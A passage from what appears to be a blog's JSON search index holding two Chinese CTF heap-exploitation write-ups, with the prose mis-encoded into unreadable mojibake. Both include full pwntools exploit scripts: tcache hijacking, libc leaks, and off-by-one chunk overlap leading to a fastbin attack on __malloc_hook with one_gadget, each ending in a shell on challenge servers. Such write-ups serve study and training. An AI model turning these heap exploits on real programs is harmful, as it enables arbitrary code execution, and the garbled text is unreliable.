ï¼ˆä¼¼ä¹è¿˜æœ‰åˆ«çš„æ–¹æ³•ï¼Œæˆ‘å†æƒ³æƒ³è¿˜èƒ½ä¸èƒ½ç”¨åˆ«çš„æ–¹æ³•åšå‡ºæ¥ï¼ˆé€ƒ ï¼‰ å¥½åƒåˆæ‰¾åˆ°äº†ä¸€ç§æ„é€ æ–¹å¼ï¼Œæœ¬è´¨æ€è·¯æ²¡æœ‰å˜ï¼Œç»†èŠ‚ç¨å¾®æ”¹åŠ¨äº†ä¸€ä¸‹ï¼Œæ¯”å¦‚æ³„æ¼libcæ¢æˆäº†0å·chunkï¼ˆå“ˆå“ˆå“ˆ from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: é€ƒé€¸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: æ³„æ¼libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #è§¦å‘one_gadget p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 å…¬å¼€èµ›]simpleHeap","content":"é€šè¿‡è¿™ä¸ªé¢˜ç›®æ¥å­¦ä¹  off-by-one ä»€ä¹ˆæ˜¯off by one(null) ? å®šä¹‰æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œç›´æ¥è¯´æˆ‘çš„ç†è§£ã€‚å°±æ˜¯é‚£ç§åœ¨ç”¨æˆ·è¾“å…¥æ—¶ï¼Œä¸€ä¸ªå¾ªç¯å¤„ç†è¾¹ç•Œé—®é¢˜æˆ–è€…æ˜¯æ•°ç»„è¶Šç•Œï¼Œå¯¹æˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¾ˆå¥½çš„å¤„ç†ï¼Œå°±ä¼šå¯¼è‡´ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼ˆæˆ–è€…æ˜¯strcpyå¤„ç†ä¸å½“ï¼‰ã€‚ åˆ©ç”¨off-by-one æœ‰å¸ˆå‚…å–œæ¬¢å«off-by-one ä¸ºä¸€ä¸ªå­—èŠ‚çš„å·æ¸¡æ”»å‡» ç»™æ”»å‡»è€…å‘æŒ¥çš„æ”»å‡»ç©ºé—´ä¹Ÿåªæœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼è¿˜æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ æˆ‘ä»¬æœ€å¸¸åˆ©ç”¨çš„ï¼ˆæˆ–è®¸æ˜¯ï¼‰æ‰‹æ³•æ˜¯ å †å—é‡å ï¼ˆchunk extendï¼‰ï¼Œè·Ÿæˆ‘ä¹‹å‰è®²è¿‡çš„â€œå †å—æ€€å­•â€æœ¬è´¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œchunk extend çš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š 1ï¼Œèƒ½å¤Ÿè¿›è¡Œå †ç©ºé—´çš„å¸ƒå±€ï¼ˆå³å†™å…¥ä¹‹ç±»çš„åŠŸèƒ½ï¼‰ 2ï¼Œè‡³å°‘èƒ½å¤Ÿæº¢å‡ºä¸€ä¸ªå­—èŠ‚ å…¶ä¸­ç¬¬äºŒä¸ªæ¡ä»¶æ­£å¥½ç¬¦åˆoff-by-oneçš„æƒ…æ™¯ åˆ©ç”¨è¿‡ç¨‹ï¼šoff-by-one + chunk extend ç”±äºæœ¬äººæ°´å¹³æœ‰é™ï¼ˆwtcl orz æ‰€ä»¥å°±ä¸¾ä¸¤ä¸ªä¾‹å­å¥½äº†ï¼Œä¸€ä¸ªæ˜¯å¼€å¯äº†Full RELROï¼Œä¸€ä¸ªæ²¡å¼€å¯ gotè¡¨æ— é˜²æŠ¤çš„åˆ©ç”¨æƒ…æ™¯ æ—¢ç„¶gotè¡¨æ— é˜²æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºæ¥æ”¹å†™gotè¡¨ï¼Œçœ‹è¯¦ç»†çš„cä»£ç ï¼š #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } æ€è·¯æ˜¯ç”³è¯·ä¸‰ä¸ªchunkï¼Œå¤§å°åˆ†åˆ«ä¸º0x18,0x20,0x30 ç¬¬ä¸€ä¸ªchunkç”¨æ¥å‡ºå‘off-by-one æ¼æ´ï¼Œç¬¬äºŒä¸ªchunkç”¨æ¥æ„ç­‘å †å—é‡å ï¼Œç¬¬ä¸‰ä¸ªchunkç”¨æ¥æ„ç­‘ fake chunkï¼Œæˆ‘ä»¬åˆ©ç”¨ç¬¬ä¸€ä¸ªchunkæº¢å‡ºä¸€å­—èŠ‚æ¥æ”¹å†™ç¬¬äºŒä¸ªchunkçš„sizeä½ï¼Œç„¶åå°†ç¬¬ä¸‰ä¸ªchunkæ¥åŒ…å«è¿›å»ï¼Œç„¶åfreeä¸¤æ¬¡ï¼Œåœ¨mallocä¸€æ¬¡ï¼Œæ‹¿åˆ°big chunkçš„æ§åˆ¶æƒï¼Œé€šè¿‡å‘big chunké‡Œå†™å…¥å†…å®¹ï¼Œæ”¹å†™free small chunkçš„fd pointer(æ­¤æ—¶smaller chunkè¿˜æ˜¯freeæ€)ï¼Œæ¥ç€mallocä¸¤æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ‹¿åˆ°ä¸€ä¸ªfake chunkï¼Œå¦‚æœfake chunkä½äºgotè¡¨é™„è¿‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åŠ«æŒgotè¡¨é¡¹ç»§è€Œæ‹¿åˆ°shell æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å…·ä½“çš„è°ƒè¯•è¿‡ç¨‹ã€‚ mallocæ‹¿åˆ°ä¸‰ä¸ªå †å—ï¼š äººä¸ºæ„é€ ä¸€ä¸ªoff-by-oneæ¥æº¢å‡ºä¸€å­—èŠ‚ï¼š freeä¸¤æ¬¡ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ”¹å†™åçš„chunkå·²ç»å˜æˆäº†freeæ€ï¼š é€šè¿‡å‘big chunké‡Œå†™å†…å®¹å¯ä»¥æ”¹å†™fd pointerï¼Œå¯ä»¥çœ‹åˆ°2å·chunkçš„pointerå·²ç»å˜æˆäº†â€˜AAAAâ€™â€¦â€¦ è¿™ä¸ªä¾¿æ˜¯åŠ«æŒgotè¡¨çš„æµç¨‹ got è¡¨ä¸å¯å†™ï¼š å¯¹äºgotè¡¨é¡¹ä¸å¯å†™çš„elfï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿé‰´fastbin attackçš„æ€è·¯æ¥æ”»å‡»__malloc_hookå‡½æ•°ï¼Œå°†__malloc_hookå‡½æ•°æ”¹å†™æˆone_gadgetï¼Œè§¦å‘mallocæ‹¿shell æ€è·¯å¾ˆç®€å•ï¼Œå¤§ä½“æ€è·¯å’Œä¸Šé¢ä¸€æ ·ï¼Œç„¶åä¸‰å·chunkçš„fd pointerå¯ä»¥å†™æˆ__malloc_hook+23çš„ä½ç½®ï¼ˆå­—èŠ‚é”™ä½ï¼Œå…·ä½“åŸå› ä¸å†èµ˜è¿°ï¼‰ï¼Œç„¶åå°†__malloc_hookæ”¹å†™å³å¯ï¼Œæ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†è¾¾åˆ°fastbin attackçš„ç›®çš„ï¼Œæˆ‘ä»¬3å·å—çš„memå¤§å°å¿…é¡»æ˜¯0x60ï¼Œå› ä¸ºè¦æŠŠ0x7fçš„fake chunké“¾æ¥åœ¨åŒä¸€ä¸ªbinä¸­ é¢˜ç›®è§£æï¼š é€†å‘è¿‡ç¨‹ï¼š ä»£ç é‡å°šå¯ï¼Œoff-by-oneçš„æ¼æ´è¿˜æ˜¯æœ‰ä¸€å®šéšç§˜æ€§çš„ï¼Œå…·ä½“çš„é€†å‘åˆ†æä¸å†èµ˜è¿° æ³¨æ„ä¸¤ä¸ªç‚¹å³å¯ï¼š ç¬¬ä¸€ï¼Œæœ¬ç¨‹åºä¸å­˜åœ¨UAFæ¼æ´ï¼Œå³deleteå‡½æ•°ä¸­å¯¹freeçš„chunkå¤„ç†çš„å¾ˆå¥½ï¼ŒæŠŠfreeæ€çš„æŒ‡é’ˆæ•°æ®éƒ½ç»™æ¸…ç©ºäº† ç¬¬äºŒï¼Œå°±æ˜¯off-by-oneçš„äº§ç”Ÿçš„ä½ç½® å¯ä»¥çœ‹åˆ°ï¼Œifåˆ¤æ–­è¯­å¥æ˜¯å°äºå·ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å˜é‡ç­‰äºsize+1çš„æ—¶å€™ä¾ç„¶å¯ä»¥å¯ä»¥è¯»å…¥æ•°æ®ï¼Œè¿™å°±æ˜¯å…¸å‹çš„off-by-oneæ¼æ´ pwn it ï¼ï¼ï¼ æ€è·¯åˆ†æ è¿™ä¸ªç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½æ”»å‡»gotè¡¨äº†ï¼Œæˆ‘ä»¬åªèƒ½é€‰æ‹©__malloc_hookå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬è¦æƒ³æ‰¾åˆ°__malloc_hookå‡½æ•°ï¼Œæˆ‘ä»¬å¿…é¡»æ³„æ¼libcï¼Œä½†æ˜¯ç¨‹åºåªå…è®¸æˆ‘ä»¬ç”³è¯·fastbinå¤§å°çš„chunk è¿™ä¸ªé¢˜æœ‰ä¸€ä¸ªå¾ˆå·§å¦™çš„æ³„æ¼libcçš„æ–¹æ³•ï¼Œå°±æ˜¯å°†ä¸¤ä¸ªfastbinåˆå¹¶æˆä¸€ä¸ªunsortedbinï¼Œåˆ©ç”¨unsorted binæ¥æ³„æ¼main_arena + 88çš„ä½ç½®ï¼Œç„¶åæ‹¿åˆ°libcåŸºå€ã€‚ å…·ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œæ„é€ å››ä¸ªchunkï¼š chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 ï¼ˆé˜²æ­¢ä¸top chunkåˆå¹¶ï¼‰ æˆ‘ä»¬é€šè¿‡off-by-oneå°†1å’Œ2åˆå¹¶ï¼Œfree 1ï¼Œè¿™ä¸ªæ—¶å€™1å’Œ2åˆå¹¶çš„chunkå·²ç»è¶…è¿‡fastbinï¼Œè¿›å…¥unsorted binï¼Œæˆ‘ä»¬å†malloc(0x50)ï¼Œè¿™ä¸ªæ—¶å€™unsorted binå°±ä¼šåˆ‡å‰²ä¸‹æ¥0x50ï¼Œå‰©ä¸‹2å·chunkç•™åœ¨unsorted biné‡Œé¢ï¼Œä½†æ˜¯ï¼ï¼æˆ‘ä»¬ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰free chunk 2ï¼Œ2å·æŒ‡é’ˆçš„æ§åˆ¶æƒä»ç„¶åœ¨æˆ‘ä»¬æ‰‹ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰“å°2å·chunkçš„å†…å®¹ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸º2å·chunkåœ¨unsorted biné‡Œï¼Œå…¶fd å’Œ bkéƒ½æ˜¯æœ‰å†…å®¹çš„ï¼ï¼ä»–ä»¬éƒ½æŒ‡å‘äº†main_arena + 88ï¼Œé€šè¿‡è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±èƒ½æ³„æ¼å‡ºlibcçš„åŸºåœ°å€ æˆ‘ä»¬æ‹¿åˆ°åŸºå€åï¼Œå°±å¾—æƒ³åŠæ³•fastbin attackï¼Œæœ‰ä¸€ç§åŠæ³•å°±æ˜¯æˆ‘ä»¬ä¸Šæ–‡è¯´çš„æ–¹æ³•ï¼Œæ„é€ ä¸‰ä¸ªfastbin chunkï¼Œè‡ªç„¶æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®é™åˆ¶æˆ‘ä»¬mallocæ¬¡æ•°ï¼Œæˆ‘ä»¬è¿˜æœ‰åŠæ³•å—ï¼Ÿï¼ˆè¿™ä¸ªé¢˜ç›®è™½ç„¶é™åˆ¶æ¬¡æ•°ï¼Œä½†æ˜¯ä¾ç„¶ç”³è¯·ä¸‰æ¬¡ä¾ç„¶åœ¨å…è®¸çš„èŒƒå›´ä¹‹å†…ï¼‰ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥malloc(0x60)ï¼Œè®°æˆchunk 4ï¼Œç„¶åæˆ‘ä»¬ç´§æ¥ç€free 4ï¼Œè¿™ä¹ˆåšçš„ç›®çš„å°±æ˜¯å°†è¿™å—chunkä»unsorted binä¸­ç§»åŠ¨åˆ° fastbinä¸­ï¼Œso æˆ‘ä»¬å†æ¬¡åˆ©ç”¨ allocated æ€çš„2å·pointeræ¥editï¼ŒæŠŠfdä½æ”¹æˆ__malloc_hook - 0x23ï¼Œç„¶åone_gadget ä½†æ˜¯è¿™ä¸ªé¢˜ç›®åœ¨gadgetçš„æ—¶å€™æˆ‘ä»¬å‘ç°æ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºå››ä¸ªgadgetçš„å¯„å­˜å™¨çš„æ¡ä»¶æˆ‘ä»¬å‡ä¸æ»¡è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å€ŸåŠ©__libc_reallocå‡½æ•°æ¥è°ƒæ•´å¯„å­˜å™¨çš„å€¼ï¼Œåœ¨__libc_reallocå‡½æ•°ä¸­ä¼šè°ƒç”¨__realloc_hookå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠone_gadgetçš„ä½ç½®æ‰“åˆ°__realloc_hookçš„ä½ç½®ï¼ŒæŠŠ__libc_reallocçš„åœ°å€æ‰“åˆ°__malloc_hooké‡Œé¢å³å¯ï¼Œä»¤äººå…´å¥‹çš„æ˜¯ï¼Œ__realloc_hookçš„ä½ç½®å°±åœ¨__malloc_hookçš„ä¸Šæ–¹ï¼Œè¿™æ ·æˆ‘ä»¬çš„ç¨‹åºæ‰§è¡Œæµç¨‹ä¸ºï¼Œæˆ‘ä»¬malloc---&gt;è§¦å‘__malloc_hook---&gt;è·³è½¬åˆ°__libc_reallocè°ƒæ•´å¯„å­˜å™¨---&gt;è§¦å‘__realloc_hook---&gt;__realloc_hookæ˜¯æˆ‘ä»¬çš„one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 æ¼æ´åˆ©ç”¨ exp:ï¼ˆpwntoolsç‰ˆæœ¬æ˜¯python3çš„ç‰ˆæœ¬ï¼‰ from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}